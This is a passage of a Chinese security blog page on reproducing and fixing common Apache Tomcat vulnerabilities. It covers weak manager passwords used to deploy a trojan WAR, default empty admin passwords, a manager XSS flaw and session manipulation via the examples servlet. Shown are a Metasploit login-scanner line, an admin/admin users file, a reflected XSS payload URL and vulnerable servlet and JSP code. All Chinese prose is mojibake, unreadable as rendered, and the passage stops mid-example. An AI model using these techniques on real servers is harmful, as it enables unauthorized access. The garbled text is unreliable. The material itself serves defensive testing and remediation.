<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="content-language" content="zh-CN"/>
    <meta name="author" content="WeiyiGeek" />
    <meta name="msvalidate.01" content="5C552FB1D885E0E11D2957EC958C8018" />
    <meta name="shenma-site-verification" content="4c655e91c76be0a93c1b6954c666c9d6_1649049085"/>
    <meta name="bytedance-verification-code" content="lKs4FqwCHSJ3A/c5tT7X" />
    <meta name="sogou_site_verification" content="OC65iET6Bk" />
    
    <title>ğŸŒ Tomcatè„†å¼±æ€§å¸¸è§æ¼æ´æŸ¥çœ‹éªŒè¯|WeiyiGeek Blog|å”¯ä¸€æå®¢Geek-ITç½‘ç»œå®‰å…¨è¿ç»´å¼€å‘æŠ€æœ¯çŸ¥è¯†åˆ†äº«-åšå®¢ç«™ç‚¹</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    
    
    <meta name="keywords" content="Tomcat">
    <meta name="Description" content="WeiyiGeek-å”¯ä¸€æå®¢åšå®¢ç«™ç‚¹,å…³æ³¨äºç½‘ç»œå®‰å…¨è¿ç»´,Webå®‰å…¨å¼€å‘,IOTç‰©è”ç½‘å®‰å…¨å¼€å‘,åº”ç”¨å¼€å‘,åˆ†äº«æŠ€æœ¯å­¦ä¹ çŸ¥è¯†ä¸å…¥å‘è§£å†³,æå‡ç½‘ç»œå®‰å…¨æŠ€æœ¯ä¸è‡ªèº«æŠ€æœ¯èƒ½åŠ›,ç«‹å¿—ç»´æŠ¤å¤§ä¼—ç½‘ç»œå®‰å…¨ä¸ºå·±ä»»,åšä¸€ä¸ªå¯¹å›½å®¶æœ‰ç”¨çš„äºº,ä¸ºå®ç°ä¸­åæ°‘æ—ä¼Ÿå¤§å¤å…´çš„ä¸­å›½æ¢¦ä¸æ‡ˆå¥‹æ–—">
    <link rel="shortcut icon" href="/img/favicon.ico">
    <link rel="stylesheet" href="/css/jquery/3.5.2-jquery.fancybox.min.css?v=1.6.6" />
    <link rel="stylesheet" href="/css/style.css?v=1.6.6">
    <!--  -->
     <script type="text/javascript" src="/js/custom/articlecost.js?v=1.6.6"></script> 
    <link rel="stylesheet" href="/css/third-party/gitalk.css?v=1.6.6"> 
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-9134434519967436" crossorigin="anonymous"></script>    
    <script type="text/javascript">
        // Data Center
        var DC = {
          reward:	true,
          lv: JSON.parse('{"enable":false,"app_id":null,"app_key":null,"icon":true}'),
          v: JSON.parse('{"enable":false,"appid":null,"appkey":null,"notify":true,"verify":true,"placeholder":"give me some sugers plz...","avatar":"wavatar"}')
        };
    </script>
    <script type="text/javascript">window.lazyScripts=[];</script>
<meta name="generator" content="Hexo 4.2.1"><link rel="alternate" href="/atom.xml" title="WeiyiGeek Blog" type="application/atom+xml">
</head>

<body>
    <div id="loading" class="active"></div>

    <aside id="menu" class="">
  <div class="inner flex-row-vertical">
    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
        <i class="icon icon-lg icon-close"></i>
    </a>
    <div class="brand-wrap">
      
      <img src="/img/brand.jpg" class="brand-bg" alt="WeiyiGeek-backgroud">
      
      <div class="brand">
        <a href="/" class="avatar waves-effect waves-circle waves-light">
          <img src="/img/avatar.jpg" alt="WeiyiGeek-å¤´åƒ">
        </a>
        <hgroup class="introduce">
          <h5 class="nickname">WeiyiGeek</h5>
          <a href="mailto:master@weiyigeek.top" title="master@weiyigeek.top" class="mail">
            <span>m</span><span>a</span><span>s</span><span>t</span><span>e</span><span>r</span><span>@</span><span>w</span><span>e</span><span>i</span><span>y</span><span>i</span><span>g</span><span>e</span><span>e</span><span>k</span><span>.</span><span>t</span><span>o</span><span>p</span>
          </a>
        </hgroup>
        
        <ul class="menu-link">
          
              <li>
                <a href="https://weiyigeek.top/img/wechat-search.png" target="_blank">
                  <i class="icon icon-lg icon-wechat"></i>
                </a>
              </li>
            
              <li>
                <a href="https://github.com/weiyigeek" target="_blank">
                  <i class="icon icon-lg icon-github"></i>
                </a>
              </li>
            
              <li>
                <a href="https://t.me/WeiyiGeek" target="_blank">
                  <i class="icon icon-lg icon-telegram"></i>
                </a>
              </li>
            
              <li>
                <a href="https://twitter.com/WeiyiGeek" target="_blank">
                  <i class="icon icon-lg icon-twitter"></i>
                </a>
              </li>
            
              <li>
                <a href="https://weibo.com/615643678" target="_blank">
                  <i class="icon icon-lg icon-weibo"></i>
                </a>
              </li>
            
        </ul>
        
      </div>
    </div>
    <div class="scroll-wrap flex-col">
      <ul class="nav">
        
            <li class="">
              <a href="/"  >
                <i class="icon icon-lg icon-home"></i>
                é¦–é¡µ
              </a>
            </li>
        
            <li class="">
              <a href="/categories"  >
                <i class="icon icon-lg icon-th-list"></i>
                æ–‡ç« åˆ†ç±»
              </a>
            </li>
        
            <li class="">
              <a href="/tags"  >
                <i class="icon icon-lg icon-tags"></i>
                æ–‡ç« æ ‡ç­¾
              </a>
            </li>
        
            <li class="">
              <a href="/archives"  >
                <i class="icon icon-lg icon-archives"></i>
                æ–‡ç« å½’æ¡£
              </a>
            </li>
        
            <li class="">
              <a href="/2018/1-1-1.html"  >
                <i class="icon icon-lg icon-mortar-board"></i>
                å­¦ä¹ ä¹‹è·¯
              </a>
            </li>
        
            <li class="">
              <a href="/books"  >
                <i class="icon icon-lg icon-book"></i>
                å­¦ä¹ ä¹¦ç±
              </a>
            </li>
        
            <li class="">
              <a href="/about"  >
                <i class="icon icon-lg icon-user"></i>
                å…³äºä½œè€…
              </a>
            </li>
        
            <li class="">
              <a href="/links"  >
                <i class="icon icon-lg icon-link"></i>
                ç«™ç‚¹å¯¼èˆª
              </a>
            </li>
        
            <li class="">
              <a href="/img/share-wechat.jpg" target="_blank" >
                <i class="icon icon-lg icon-wechat"></i>
                å…¬ä¼—è´¦å·
              </a>
            </li>
        
            <li class="">
              <a href="https://space.bilibili.com/385802642" target="_blank" >
                <i class="icon icon-lg icon-youtube-play"></i>
                å“”å“©å“”å“©
              </a>
            </li>
        
            <li class="">
              <a href="https://github.com/weiyigeek" target="_blank" >
                <i class="icon icon-lg icon-github"></i>
                Github
              </a>
            </li>
        
            <li class="">
              <a href="https://twitter.com/WeiyiGeek" target="_blank" >
                <i class="icon icon-lg icon-twitter"></i>
                Twitter
              </a>
            </li>
        
            <li class="">
              <a href="https://weibo.com/615643678" target="_blank" >
                <i class="icon icon-lg icon-weibo"></i>
                Weibo
              </a>
            </li>
        
      </ul>
    </div>
  </div>
</aside>

    <main id="main">
        <header class="top-header" id="header">
    <div class="flex-row clearfix">
        <a href="javascript:;" class="header-icon pull-left waves-effect waves-circle waves-light on" id="menu-toggle">
          <i class="icon icon-lg icon-navicon"></i>
        </a>
        <div class="flex-col header-title ellipsis">
            <span>Tomcatè„†å¼±æ€§å¸¸è§æ¼æ´æŸ¥çœ‹éªŒè¯</span>
            
        </div>

        
        <a href="javascript:;" id="site_search_btn" class="header-icon pull-right waves-effect waves-circle waves-light">
            <i class="icon icon-lg icon-search"></i>
        </a>
        

        
            <a href="/atom.xml" class="header-icon pull-right waves-effect waves-circle waves-light">
                <i class="icon icon-lg icon-rss"></i>
            </a>
        
    </div>
</header>
<header class="content-header post-header">
    <img src="/img/banner.jpg" class="header-bg" alt="æ–‡ç« å¤´éƒ¨èƒŒæ™¯">
    <div class="container fade-scale">
        <h1 class="title">Tomcatè„†å¼±æ€§å¸¸è§æ¼æ´æŸ¥çœ‹éªŒè¯</h1>
        <h5 class="subtitle">
            
                <time datetime="2019-09-09T05:30:30.000Z" itemprop="datePublished" class="page-time">
  2019-09-09
</time>


	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/">å®‰å…¨æµ‹è¯•</a></li></ul>


            
        </h5>
        
    </div>
    

</header>

<div id="site_search">
    <div class="search-title clearfix">
        <span class="pull-left">
          <i class="icon icon-lg icon-search"></i>
        </span>
        <input type="text" id="local-search-input" name="q" results="0" placeholder="search my blog..." class="form-control pull-left"/>
        <a href="javascript:;" class="close pull-right waves-effect waves-circle waves-light">
          <i class="icon icon-lg icon-close"></i>
        </a>
    </div>
    <div id="local-search-result"></div>
</div>


<div class="container body-wrap">
  <article id="post-ç½‘å®‰å¤§ç±»/Vulnerable/Web/Tomcatè„†å¼±æ€§ä¸€è§ˆè¡¨"
  class="post-article article-type-post" itemprop="blogPost">
    <div class="post-card">
        <h1 class="post-card-title">Tomcatè„†å¼±æ€§å¸¸è§æ¼æ´æŸ¥çœ‹éªŒè¯</h1>
        <div class="post-meta">
            <time class="post-time" title="2019-09-09 13:30:30" datetime="2019-09-09T05:30:30.000Z"  itemprop="datePublished">2019-09-09</time>

            
	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/">å®‰å…¨æµ‹è¯•</a></li></ul>



            

            


            
        </div>
        <div class="post-content" id="post-content" itemprop="postContent">
            
            <p><b style="color:red">æ³¨æ„ï¼šæœ¬æ–‡åˆ†äº«ç»™å®‰å…¨ä»ä¸šäººå‘˜ã€ç½‘ç«™å¼€å‘äººå‘˜ä»¥åŠè¿ç»´äººå‘˜åœ¨æ—¥å¸¸å·¥ä½œé˜²èŒƒæ¶æ„æ”»å‡»,è¯·å‹¿æ¶æ„ä½¿ç”¨ä¸‹é¢ä»‹ç»æŠ€æœ¯è¿›è¡Œéæ³•æ”»å‡»æ“ä½œã€‚ã€‚</b></p>
<a id="more"></a>
<p><strong>æœ¬æ–‡ç›®å½•</strong></p>
<p>[TOC]</p>
<!-- more -->
<h2 id="0x00-å‰è¨€ç®€è¿°"><a href="#0x00-å‰è¨€ç®€è¿°" class="headerlink" title="0x00 å‰è¨€ç®€è¿°"></a>0x00 å‰è¨€ç®€è¿°</h2><p>æè¿°: é¡¹ç›®ä¸­ä¼šç»å¸¸é‡åˆ°Apache Tomcatä¸­é—´ä»¶æ„ˆæ¥æ„ˆå¤š, æ‰€ä»¥ä½œä¸ºä¸€ä¸ªå®‰å…¨è¿ç»´å·¥ä½œè€…ï¼Œåœ¨å·¥ä½œä¸­å°†<code>Apache Tomcat</code>ä¸­é—´ä»¶çš„å‡ å¤§è¾ƒä¸ºé‡è¦çš„é«˜å±æ¼æ´åšä¸€ä¸ªæ€»ç»“æ•´ç†å¤ç°ã€‚</p>
<p><strong>Tomcatçš„é«˜å±æ¼æ´åˆ—è¡¨:</strong></p>
<ul>
<li><p>1.Tomcatåå°å¼±å£ä»¤ä¸Šä¼ waråŒ…</p>
</li>
<li><p>2.Tomcatçš„PUTçš„ä¸Šä¼ æ¼æ´<code>(CVE-2017-12615)</code></p>
</li>
<li><p>3.Tomcatååºåˆ—åŒ–æ¼æ´<code>(CVE-2016-8735)</code></p>
</li>
<li><p>4.TomcatJMXæœåŠ¡å™¨å¼±å£ä»¤</p>
</li>
<li><p>5.Tomcatæ ·ä¾‹ç›®å½•sessionæ“æ§æ¼æ´</p>
</li>
<li><p>6.Tomcatæœ¬åœ°ææƒæ¼æ´<code>(CVE-2016-1240)</code></p>
</li>
<li><p>7.Tomcat-winç‰ˆé»˜è®¤ç©ºå£ä»¤æ¼æ´<code>(CVE-2009-3548)</code></p>
</li>
</ul>
<hr>
<h2 id="0x02-æ¼æ´åˆ©ç”¨ä¸é˜²å¾¡æµ…æ"><a href="#0x02-æ¼æ´åˆ©ç”¨ä¸é˜²å¾¡æµ…æ" class="headerlink" title="0x02 æ¼æ´åˆ©ç”¨ä¸é˜²å¾¡æµ…æ"></a>0x02 æ¼æ´åˆ©ç”¨ä¸é˜²å¾¡æµ…æ</h2><h3 id="1-Tomcatåå°å¼±å£ä»¤ä¸Šä¼ waråŒ…"><a href="#1-Tomcatåå°å¼±å£ä»¤ä¸Šä¼ waråŒ…" class="headerlink" title="1.Tomcatåå°å¼±å£ä»¤ä¸Šä¼ waråŒ…"></a>1.Tomcatåå°å¼±å£ä»¤ä¸Šä¼ waråŒ…</h3><p><strong>æè¿°:</strong> ç¬¬ä¸€ä¸ªTomcatåå°å¼±å£ä»¤ä¸Šä¼ waråŒ…, åœ¨è¿™é‡Œæˆ‘ä»¬å°±æ˜¯åˆ©ç”¨æš´åŠ›ç ´è§£æˆ–è€…å¼±å£ä»¤çŒœè§£çš„æ–¹å¼å¾—åˆ°tomcatçš„åå°ç™»é™†è®¤è¯è´¦æˆ·ï¼Œå³åœ¨ç™»é™†æˆåŠŸä¹‹æ—¶åˆ©ç”¨<code>tomcat</code>ç®¡ç†æ§åˆ¶å°<code>WAR file to deploy</code>, è‡ªåŠ¨éƒ¨ç½²warçš„åŠŸèƒ½å°†æˆ‘ä»¬çš„æœ¨é©¬è¿›è¡Œä¸Šä¼ éƒ¨ç½²ã€‚</p>
<p><strong>æˆæƒè®¤è¯:</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Tomcat æˆæƒè®¤è¯: åˆ©ç”¨Authorizationè¯¥Headeræˆæƒå­—æ®µä»¥base64æ–¹å¼ä¼ é€’è´¦æˆ·ä¿¡æ¯ï¼Œå°†è´¦å·ä¸å¯†ç ç”¨å†’å·è¿›è¡Œç»„åˆå†è¾…ä»¥base64åŠ å¯†æ‰€ä¼ é€’ã€‚</span></span><br><span class="line">Authorization: Basic V2VpeWlHZWVrOjEyMzQ1Ng==</span><br></pre></td></tr></table></figure></p>
<p><strong>çˆ†ç ´é™åˆ¶:</strong> å½“çˆ†ç ´å¾ˆå¤šæ¬¡ï¼Œå‘ç°æ­£ç¡®çš„ç”¨æˆ·åå¯†ç å­—å…¸çˆ†ç ´å‡ºæ¥ä¸€ç›´æ˜¯å¤±è´¥çš„401çŠ¶æ€ç ã€‚<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># åœ¨ `conf/server.xml` ä¸­æ·»åŠ ä¸€æ®µ `failureCount="500"lockOutTime="0"` è¶…æ—¶é”å®šæ•°çš„è®¾ç½®ã€‚</span></span><br><span class="line">&lt;Realm className=<span class="string">"org.apache.catalina.realm.LockOutRealm"</span> failureCount=<span class="string">"500"</span> lockOutTime=<span class="string">"0"</span>&gt; &lt;/Realm&gt;</span><br></pre></td></tr></table></figure></p>
<figure class="image-box">
                <a rel=Tomcatè„†å¼±æ€§å¸¸è§æ¼æ´æŸ¥çœ‹éªŒè¯ href="https://img.weiyigeek.top/2021/5/20210803145850.png" target="_blank" title="WeiyiGeek.Tomcat" data-fancybox="images"><img src="https://img.weiyigeek.top/2021/5/20210803145850.png" alt="WeiyiGeek.Tomcat" title="" class=""></a>
                <p>WeiyiGeek.Tomcat</p>
            </figure>
<p><br/></p>
<p><strong>ä¿®å¤æ–¹æ¡ˆ:</strong></p>
<ul>
<li>1ã€åœ¨ç³»ç»Ÿä¸Šä»¥ä½æƒé™è¿è¡ŒTomcatåº”ç”¨ç¨‹åºã€‚åˆ›å»ºä¸€ä¸ªä¸“é—¨çš„ TomcatæœåŠ¡ç”¨æˆ·ï¼Œè¯¥ç”¨æˆ·åªèƒ½æ‹¥æœ‰ä¸€ç»„æœ€å°æƒé™ï¼ˆä¾‹å¦‚ä¸å…è®¸è¿œç¨‹ç™»å½•ï¼‰ã€‚</li>
<li>2ã€å¢åŠ å¯¹äºæœ¬åœ°å’ŒåŸºäºè¯ä¹¦çš„èº«ä»½éªŒè¯ï¼Œéƒ¨ç½²è´¦æˆ·é”å®šæœºåˆ¶ï¼ˆå¯¹äºé›†ä¸­å¼è®¤è¯ï¼Œç›®å½•æœåŠ¡ä¹Ÿè¦åšç›¸åº”é…ç½®ï¼‰, åœ¨<code>CATALINA_HOME/conf/web.xml</code>æ–‡ä»¶è®¾ç½®é”å®šæœºåˆ¶å’Œæ—¶é—´è¶…æ—¶é™åˆ¶ã€‚</li>
<li>3ã€ä»¥åŠé’ˆå¯¹<code>manager-gui/manager-status/manager-script</code>ç­‰ç›®å½•é¡µé¢è®¾ç½®æœ€å°æƒé™è®¿é—®é™åˆ¶ã€‚</li>
</ul>
<hr>
<h2 id="0x03-æ¼æ´åˆ©ç”¨ä¸é˜²å¾¡æµ…æ"><a href="#0x03-æ¼æ´åˆ©ç”¨ä¸é˜²å¾¡æµ…æ" class="headerlink" title="0x03 æ¼æ´åˆ©ç”¨ä¸é˜²å¾¡æµ…æ"></a>0x03 æ¼æ´åˆ©ç”¨ä¸é˜²å¾¡æµ…æ</h2><h4 id="0x01-Manager-administratorç®¡ç†é¡µé¢ç™»å½•"><a href="#0x01-Manager-administratorç®¡ç†é¡µé¢ç™»å½•" class="headerlink" title="0x01 Manager administratorç®¡ç†é¡µé¢ç™»å½•"></a>0x01 Manager administratorç®¡ç†é¡µé¢ç™»å½•</h4><p>æè¿°:å¦‚æœé‡‡ç”¨çš„æ˜¯è¿è¡Œåœ¨Windowså¹³å°ä¸Šçš„Tomcatå®‰è£…ç‰ˆï¼Œå¹¶ä¸”ç‰ˆæœ¬åœ¨<code>Tomcat 5.5.0 to 5.5.28</code>æˆ–<code>Tomcat 6.0.0 to 6.0.20</code>ä¹‹é—´å¯ä»¥åˆ©ç”¨CVE-2009-3548æ¼æ´æ¥ç™»å½•åå°ã€‚<br>æ¼æ´æè¿°:å—è¯¥æ¼æ´å½±å“çš„Tomcatç‰ˆæœ¬å¦‚æœåœ¨å®‰è£…æ—¶ä¸æ›´æ”¹ï¼Œé‚£ä¹ˆTomcaté»˜è®¤ä¼šå»ºç«‹ä¸€ä¸ªåä¸ºâ€œadminâ€ï¼Œå¯†ç ä¸ºç©ºçš„å…·æœ‰ç®¡ç†æƒé™çš„è´¦å·ã€‚<br>æ¼æ´ç¼–å·:CVE-2009-3548 WINç‰ˆé»˜è®¤ç©ºå£ä»¤æ¼æ´</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf</span><br><span class="line">use auxiliary/scanner/http/tomcat_mgr_loginâ€</span><br></pre></td></tr></table></figure>
<p>è„†å¼±æ€§user.xmlé…ç½®æ–‡ä»¶ï¼š<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">tomcat-users</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">role</span> <span class="attr">rolename</span>=<span class="string">"manager-gui"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">role</span> <span class="attr">rolename</span>=<span class="string">"admin-gui"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span> <span class="attr">name</span>=<span class="string">"admin"</span> <span class="attr">password</span>=<span class="string">"admin"</span> <span class="attr">roles</span>=<span class="string">"manager-gui,admin-gui"</span> /&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">  <span class="doctag">NOTE:</span>  By default, no user is included in the "manager-gui" role required</span></span><br><span class="line"><span class="comment">  to operate the "/manager/html" web application.  If you wish to use this app,</span></span><br><span class="line"><span class="comment">  you must define such a user - the username and password are arbitrary.</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">  <span class="doctag">NOTE:</span>  The sample user and role entries below are wrapped in a comment</span></span><br><span class="line"><span class="comment">  and thus are ignored when reading this file. Do not forget to remove</span></span><br><span class="line"><span class="comment">  &lt;!.. ..&gt; that surrounds them.</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">  &lt;role rolename="tomcat"/&gt;</span></span><br><span class="line"><span class="comment">  &lt;role rolename="role1"/&gt;</span></span><br><span class="line"><span class="comment">  &lt;user username="tomcat" password="tomcat" roles="tomcat"/&gt;</span></span><br><span class="line"><span class="comment">  &lt;user username="both" password="tomcat" roles="tomcat,role1"/&gt;</span></span><br><span class="line"><span class="comment">  &lt;user username="role1" password="tomcat" roles="role1"/&gt;</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tomcat-users</span>&gt;</span></span><br></pre></td></tr></table></figure><br><figure class="image-box">
                <a rel=Tomcatè„†å¼±æ€§å¸¸è§æ¼æ´æŸ¥çœ‹éªŒè¯ href="https://img.weiyigeek.top/2019/1/20190910102416.png" target="_blank" title="WeiyiGeek." data-fancybox="images"><img src="https://img.weiyigeek.top/2019/1/20190910102416.png" alt="WeiyiGeek." title="" class=""></a>
                <p>WeiyiGeek.</p>
            </figure></p>
<h4 id="0x02-Tomcat-Manager-XSSæ¼æ´"><a href="#0x02-Tomcat-Manager-XSSæ¼æ´" class="headerlink" title="0x02 Tomcat Manager XSSæ¼æ´"></a>0x02 Tomcat Manager XSSæ¼æ´</h4><p>æ¼æ´å½±å“:Tomcat ç‰ˆæœ¬åŒ…æ‹¬ï¼š7.0.0 - 7.0.4, 6.0.12 - 6.0.29 ä»¥åŠ 5.5 çš„æ‰€æœ‰ç‰ˆæœ¬ã€‚<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/manager/html/sessions?path=/&amp;sort=<span class="string">"&gt;&lt;script&gt;alert('xss')&lt;/script&gt;order=ASC&amp;action=injectSessions&amp;refresh=Refresh+Sessions+list</span></span><br></pre></td></tr></table></figure></p>
<p><br></p>
<h4 id="0x03-Tomcatæ ·ä¾‹ç›®å½•sessionæ“çºµæ¼æ´"><a href="#0x03-Tomcatæ ·ä¾‹ç›®å½•sessionæ“çºµæ¼æ´" class="headerlink" title="0x03 Tomcatæ ·ä¾‹ç›®å½•sessionæ“çºµæ¼æ´"></a>0x03 Tomcatæ ·ä¾‹ç›®å½•sessionæ“çºµæ¼æ´</h4><p>æè¿°ï¼šApache Tomcaté»˜è®¤å®‰è£…åŒ…å«â€/examplesâ€ç›®å½•é‡Œé¢å­˜ç€ä¼—å¤šçš„æ ·ä¾‹ï¼Œå…¶ä¸­sessionæ ·ä¾‹(/examples/servlets/servlet/SessionExample)å…è®¸ç”¨æˆ·å¯¹sessionè¿›è¡Œæ“çºµã€‚<br>å› ä¸ºsessionæ˜¯å…¨å±€é€šç”¨çš„æ‰€ä»¥ç”¨æˆ·å¯ä»¥é€šè¿‡æ“çºµsessionè·å–ç®¡ç†å‘˜æƒé™,æ³¨æ„cookiesä¸sessionæ˜¯ä¸åŒçš„å‰è€…æ˜¯å­˜å‚¨å†æµè§ˆå™¨æœ¬åœ°,è€Œsessionå­˜å‚¨åœ¨æœåŠ¡ç«¯;</p>
<p>0x01 æ¼æ´åˆ†ææ¼”ç¤º<br>é¦–å…ˆï¼Œæˆ‘ä»¬å…ˆæ¥çœ‹çœ‹SessionExampleçš„éƒ¨åˆ†æºç <br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//è¡¨å•ä»£ç </span></span><br><span class="line">out.println(<span class="string">"&lt;P&gt;"</span>);</span><br><span class="line">out.print(<span class="string">"&lt;form action=\""</span>);</span><br><span class="line">out.print(response.encodeURL(<span class="string">"SessionExample"</span>));</span><br><span class="line">out.print(<span class="string">"\" "</span>);</span><br><span class="line">out.println(<span class="string">"method=POST&gt;"</span>);</span><br><span class="line">out.println(rb.getString(<span class="string">"sessions.dataname"</span>));</span><br><span class="line">out.println(<span class="string">"&lt;input type=text size=20 name=dataname&gt;"</span>);</span><br><span class="line">out.println(<span class="string">"&lt;br&gt;"</span>);</span><br><span class="line">out.println(rb.getString(<span class="string">"sessions.datavalue"</span>));</span><br><span class="line">out.println(<span class="string">"&lt;input type=text size=20 name=datavalue&gt;"</span>);</span><br><span class="line">out.println(<span class="string">"&lt;br&gt;"</span>);</span><br><span class="line">out.println(<span class="string">"&lt;input type=submit&gt;"</span>);</span><br><span class="line">out.println(<span class="string">"&lt;/form&gt;"</span>);</span><br><span class="line"> <span class="comment">//æ ¸å¿ƒä»£ç </span></span><br><span class="line">       HttpSession session = request.getSession(<span class="keyword">true</span>);</span><br><span class="line">       out.println(rb.getString(<span class="string">"sessions.id"</span>) + <span class="string">" "</span> +session.getId());</span><br><span class="line">       out.println(<span class="string">"&lt;br&gt;"</span>);</span><br><span class="line">    </span><br><span class="line">       out.println(rb.getString(<span class="string">"sessions.created"</span>) + <span class="string">" "</span>);</span><br><span class="line">       out.println(<span class="keyword">new</span> Date(session.getCreationTime()) +<span class="string">"&lt;br&gt;"</span>);</span><br><span class="line">    </span><br><span class="line">       out.println(rb.getString(<span class="string">"sessions.lastaccessed"</span>) + <span class="string">""</span>);</span><br><span class="line">       out.println(<span class="keyword">new</span> Date(session.getLastAccessedTime()));</span><br><span class="line">    </span><br><span class="line">       String dataName = request.getParameter(<span class="string">"dataname"</span>);<span class="comment">//è·å–datanameå‚æ•°çš„å€¼</span></span><br><span class="line">       String dataValue = request.getParameter(<span class="string">"datavalue"</span>);<span class="comment">//è·å–datavalueå‚æ•°çš„å€¼</span></span><br><span class="line"><span class="keyword">if</span> (dataName != <span class="keyword">null</span> &amp;&amp; dataValue != <span class="keyword">null</span>) &#123;</span><br><span class="line">           session.setAttribute(dataName, dataValue);<span class="comment">//å°†datanameå’Œdatavalueå†™å…¥session</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>ç”¨æˆ·é€šè¿‡è¡¨å•æäº¤datanameå’Œdatavalueå‚æ•°ï¼Œç„¶åé€šè¿‡request.getParameterï¼ˆï¼‰å‡½æ•°è·å–è¿™ä¸¤ä¸ªå‚æ•°çš„å€¼ï¼Œå†é€šè¿‡session.setAttribute()å‡½æ•°å°†datanameå’Œdatavalueçš„å€¼å†™å…¥sessionï¼›</p>
<p>ä¸¾ä¸ªä¾‹å­ï¼šæˆ‘ä»¬å…ˆæ¥ç¼–å†™login.jsp,login2.jsp,index.jspè¿™ä¸‰ä¸ªé¡µé¢ï¼Œé€šè¿‡è¿™ä¸‰ä¸ªé¡µé¢æ¥æ¨¡æ‹Ÿä¸€èˆ¬ç½‘ç«™èº«ä»½éªŒè¯çš„è¿‡ç¨‹ã€‚<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//login.jsp</span></span><br><span class="line">&lt;formaction=login2.jsp method=<span class="string">"POST"</span> &gt;  </span><br><span class="line">  ç”¨æˆ·å: &lt;input type=<span class="string">"text"</span>name=<span class="string">"username"</span>&gt;&lt;br&gt; </span><br><span class="line">  å¯†ç : &lt;input type=<span class="string">"text"</span> name=<span class="string">"password"</span>&gt;&lt;br&gt; </span><br><span class="line">  &lt;inputtype=<span class="string">"submit"</span> value=<span class="string">"ç™»å½•"</span>&gt;&lt;br&gt; </span><br><span class="line">&lt;form&gt;</span><br></pre></td></tr></table></figure></p>
<p>login2.jsp<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;% </span><br><span class="line"> <span class="keyword">if</span>(request.getParameter(<span class="string">"username"</span>) != <span class="keyword">null</span> &amp;&amp; request.getParameter(<span class="string">"password"</span>)!= <span class="keyword">null</span>) &#123;  </span><br><span class="line">      String username =request.getParameter(<span class="string">"username"</span>); </span><br><span class="line">      String password =request.getParameter(<span class="string">"password"</span>); </span><br><span class="line">      <span class="comment">//éªŒè¯èº«ä»½ </span></span><br><span class="line">      <span class="keyword">if</span> (username.equals(<span class="string">"admin"</span>)&amp;&amp; password.equals(<span class="string">"admin"</span>)) &#123;  </span><br><span class="line">        session.setAttribute(<span class="string">"login"</span>,<span class="string">"admin"</span>); </span><br><span class="line">        response.sendRedirect(<span class="string">"index.jsp"</span>); </span><br><span class="line">        &#125;<span class="keyword">else</span> &#123; </span><br><span class="line">           response.sendRedirect(<span class="string">"login.jsp"</span>);  </span><br><span class="line">        &#125;     </span><br><span class="line">&#125; </span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure></p>
